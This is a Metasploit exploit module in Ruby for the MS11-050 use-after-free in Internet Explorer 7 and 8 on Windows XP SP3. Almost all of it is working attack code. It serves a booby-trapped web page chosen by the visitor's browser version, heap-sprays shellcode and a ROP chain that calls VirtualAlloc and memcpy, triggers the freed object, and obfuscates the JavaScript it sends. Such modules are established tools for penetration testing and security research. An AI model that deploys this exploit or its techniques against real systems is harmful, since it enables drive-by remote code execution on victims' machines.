##
# $Id: ms11_050_mshtml_cobjectelement.rb 12962 2011-06-17 01:56:20Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "8.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, 
	})

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS11-050 IE mshtml!CObjectElement Use After Free",
			'Description'    => %q{
					This module exploits a use-after-free vulnerability in Internet Explorer. The
				vulnerability occurs when an invalid <object> tag exists and other elements overlap/cover
				where the object tag should be when rendered (due to their styles/positioning). The
				mshtml!CObjectElement is then freed from memory because it is invalid. However, the
				mshtml!CDisplay object for the page continues to keep a reference to the freed <object> and
				attempts to call a function on it, leading to the use-after-free.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 12962 $",
			'Author'         =>
				[
					'd0c_s4vage',
				],
			'References'     =>
				[
					['CVE', '2011-1256'],
					['OSVDB', '72948'],
					['MSB', 'MS11-050'],
					['URL', 'http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],

					# In IE6 the mshtml!CObjectElement size is 0xac
					[
						'Win XP SP3 Internet Explorer 7', # 7.0.5730.13
						{
							# sizeof(mshtml!CObjectElement)
							'FreedObjSize' =>  0xb0,
							'FakeObjCount' => 0x4000,
							'FakeObjCountKeep' => 0x2000,
							'ForLoopNumObjects' => 3,
							'FreedObjOverwritePointer'=>0x0c0c0c0c,
							'FreedObjOffsetAlignSize'=>0,
							'ROP' => false,
						}
					],

					[
						'Win XP SP3 Internet Explorer 8 (no DEP)', # 8.0.6001.18702
						{
							# sizeof(mshtml!CObjectElement)
							'FreedObjSize' =>  0xe0, # 0xdc rounded up
							'FakeObjCount' => 0x8000,
							'FakeObjCountKeep' => 0x3000,
							'ForLoopNumObjects' => 5,
							'FreedObjOverwritePointer'=>0x0c0c0c0c,
							'FreedObjOffsetAlignSize'=>0,
							'ROP' => false,
						}
					],

					[
						'Win XP SP3 Internet Explorer 8',
						{
							'FreedObjSize' =>  0xe0, # 0xdc rounded up
							'FakeObjCount' => 0x8000,
							'FakeObjCountKeep' => 0x3000,
							'ForLoopNumObjects' => 5,
							'FreedObjOverwritePointer'=>0x0c0c0c0c,
							'FreedObjOffsetAlignSize'=>2,
							#'StackPivot'=>0x773E3F18, # xchg eax,esp / ret - comctl32.dll
							'StackPivot' => 0x7E45F257, #xchg eax,esp - USER32.dll
							'ROP' => true,
						}
					],

					[
						'Debug Target (Crash)', {}
					],
				],
			'DisclosureDate' => "Jun 16 2011",
			'DefaultTarget'  => 0))
	end

	def auto_target(cli, request)
		agent = request.headers['User-Agent']
		if agent =~ /MSIE 8\.0/
			mytarget = targets[3] # IE 8
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[1]
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

		mytarget
	end


	# 3/22/2011
	# fully patched x32 WinXP SP3, IE 8.0.6001.18702
	def winxp_sp3_rva
		{
			#"kernel32!VirtualAlloc"  => 0x7c809af1,
			"kernel32!VirtualAlloc" => 0x7c809ae1,
			"ntdll!memcpy"           => 0x7c901db3,
		}
	end

	def compile_rop(rop_stack)
		rva = winxp_sp3_rva()
		num_random = 0
		rop_stack.map do |rop_val|
			case rop_val
			when String
				if rop_val == "random"
					# useful for debugging
					# num_random += 1
					# 0xaabbcc00 + num_random
					rand(0xffffffff)
				else
					raise RuntimeError, "Unable to locate key: #{rop_val.inspect}" unless rva[rop_val]
					rva[rop_val]
				end
			when Integer
				rop_val
			else
				raise RuntimeError, "unknown rop_val: #{rop_val.inspect}, #{rop_val.class}"
			end
		end.pack("V*")
	end

	def on_request_uri(cli, request)
		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			unless mytarget
				send_not_found(cli)
				return
			end
		end
		@mytarget = mytarget
		@debug = true if mytarget == targets[4]

		return if ((p = regenerate_payload(cli)) == nil)
		
		id_name  = rand_text_alpha(5)
		dir_name = rand_text_alpha(3)

		if @debug
			data = <<-DATA
			<html>
			<body>
			<script language='javascript'>
			document.body.innerHTML += "<object align='right' hspace='1000' width='1000'></object>";
			document.body.innerHTML += "<a id='#{id_name}' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' ></a>";
			document.body.innerHTML += "AAAAAAA";
			document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='#{dir_name}'></strong>";
			</script>
			</body>
			</html>
			DATA

			print_status("Triggering #{self.name} vulnerability at #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")
			send_response(cli, data, { 'Content-Type' => 'text/html' })
			return
		end

		raw_shellcode = payload.encoded
		shellcode = Rex::Text.to_unescape(raw_shellcode, Rex::Arch.endian(mytarget.arch))

		spray = nil
		rop_shellcode_spray = nil

		obj_overwrite_ptr = [@mytarget['FreedObjOverwritePointer']].pack("V")

		if @mytarget['ROP']
			rop_stack = []
			0x1f.times do |i|
				rop_stack << "random"
			end

			idx = -1
			idx += 1 ; rop_stack[idx] = "kernel32!VirtualAlloc"   # 1:
			idx += 1 ; rop_stack[idx] = "ntdll!memcpy"            # 2:ret 10 to this after VirtualAlloc
			idx += 1 ; rop_stack[idx] = 0x7f000000                # 1:VirtualAlloc:lpAddress
			idx += 1 ; rop_stack[idx] = 0x4000                    # 1:VirtualAlloc:dwSize
			idx += 1 ; rop_stack[idx] = (0x1000 | 0x2000)         # 1:VirtualAlloc:flAllocationType MEM_COMMIT | MEM_RESERVE
			idx += 1 ; rop_stack[idx] = 0x40                      # 1:VirtualAlloc:flProtect rwx
			idx += 1 ; rop_stack[idx] = 0x7f001000                # 3:into this after memcpy
			idx += 1 ; rop_stack[idx] = 0x7f001000                # 2:memcpy:dst
			idx += 1 ; rop_stack[idx] = 0x23000100                # 2:memcpy:src
			idx += 1 ; rop_stack[idx] = 0x2fff                    # 2:memcpy:size

			# align the rest of it
			back = rop_stack.slice!((rop_stack.length-1)-2, rop_stack.length)
			rop_stack = back + rop_stack

			rop_stack << @mytarget['StackPivot']

			# align the stack for 0c0c0c0c
			front = rop_stack.slice!(0, 19)
			rop_stack = rop_stack + front

			# resolve strings in the rop_stack array (kernel32!VirtualAlloc, random, etc)
			rop = compile_rop(rop_stack)

			nops = make_nops(0x1000 - raw_shellcode.length)
			nops = Rex::Text.to_unescape(nops, Rex::Arch.endian(mytarget.arch))

			#spray up to 0x23000000
			rop_shellcode_spray = <<-JS
			var shellcode = unescape("#{shellcode}");
			var nops = unescape("#{nops}");
			while(nops.length < 0x1000) nops += nops;
				var shell_heapblock = nops.substring(0, 0x800-shellcode.length) + shellcode;
				while(shell_heapblock.length < 0x40000) shell_heapblock += shell_heapblock;
					var shell_finalspray = shell_heapblock.substring(0, (0x20000-6)/2);
					for(var shell_counter = 0; shell_counter < 0x1000; shell_counter++) { heap_obj.alloc(shell_finalspray); }
			JS

			spray = rop
			shellcode = ""
		else
			spray = obj_overwrite_ptr
		end

		spray = Rex::Text.to_unescape(spray, Rex::Arch.endian(mytarget.arch))

		js = <<-JS
		heap_obj = new heapLib.ie(0x20000);
		var heapspray = unescape("#{spray}");
		while(heapspray.length < 0x1000) heapspray += heapspray;
			var shellcode = unescape("#{shellcode}");
			var heapblock = heapspray.substring(0, (0x800-shellcode.length)) + shellcode;
			var offset = #{[targets[1], targets[2]].include?(@mytarget) ? "0x400" : "0"};
			var front = heapblock.substring(0, offset);
			var end = heapblock.substring(offset);
			heapblock = end + front;
			while(heapblock.length < 0x20000) heapblock += heapblock;
				finalspray = heapblock.substring(0, (0x10000-6)/2);
				for(var counter1 = 0; counter1 < 0x1000; counter1++) { heap_obj.alloc(finalspray); }

				#{rop_shellcode_spray}

				var obj_overwrite = unescape("#{Rex::Text.to_unescape(obj_overwrite_ptr, Rex::Arch.endian(mytarget.arch))}");
				while(obj_overwrite.length < #{@mytarget['FreedObjSize']}) { obj_overwrite += obj_overwrite; }
				obj_overwrite = obj_overwrite.slice(0, (#{@mytarget['FreedObjSize']}-6)/2);

				for(var num_objs_counter = 0; num_objs_counter < #{@mytarget['ForLoopNumObjects']}; num_objs_counter++) {
					document.body.innerHTML += "<object align='right' hspace='1000' width='1000'>TAG_1</object>";
				}

				for(var counter4 = 0; counter4 < #{@mytarget['FakeObjCountKeep']}; counter4++) { heap_obj.alloc(obj_overwrite, "keepme1"); }
				for(var counter5 = 0; counter5 < #{@mytarget['FakeObjCountKeep']}; counter5++) { heap_obj.alloc(obj_overwrite, "keepme2"); }

				document.body.innerHTML += "<a id='tag_3' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >TAG_3</a>";
				document.body.innerHTML += "AAAA";
				document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>TAG_11</strong>";
		JS

		js = heaplib(js)
		js = ::Rex::Exploitation::JSObfu.new(js)
		js.obfuscate

		html = <<-HTML
		<html>
		<body>
		<script language='javascript'>
		#{js}
		</script>
		</body>
		</html>
		HTML

		print_status("Sending exploit for #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

		send_response(cli, html, {'Content-Type'=>'text/html'})
	end
end
